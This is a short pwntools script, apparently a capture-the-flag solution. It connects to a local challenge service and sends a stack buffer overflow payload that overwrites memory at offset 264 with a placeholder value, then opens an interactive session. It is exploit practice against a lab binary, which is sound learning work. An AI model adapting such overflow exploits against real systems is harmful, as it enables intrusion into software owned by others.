from pwn import * 
#exe = context.binary = ELF('chall')
io = remote('localhost', 1886)

io.recvuntil('see')
offset = 264
payload = fit ({
    offset: 0xdeadbeef
})

io.sendline(payload)
io.interactive()
